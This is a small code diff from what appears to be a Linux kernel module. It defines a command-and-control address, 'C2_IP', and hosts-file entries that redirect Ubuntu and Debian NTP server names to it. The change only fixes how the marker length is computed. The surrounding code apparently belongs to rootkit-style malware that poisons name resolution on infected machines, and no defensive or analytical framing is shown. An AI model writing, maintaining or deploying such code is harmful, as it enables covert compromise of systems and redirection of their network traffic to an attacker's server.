@@ -94,7 +94,7 @@ MODULE_VERSION("1.0");
 
 #define C2_IP            "87.106.187.97"
 #define HOSTS_MARKER     C2_IP
-#define HOSTS_MARKER_LEN 13
+#define HOSTS_MARKER_LEN (sizeof(C2_IP) - 1)
 #define HOSTS_ENTRIES \
 	C2_IP " ntp.ubuntu.com\n"           \
 	C2_IP " 0.debian.pool.ntp.org\n"   \
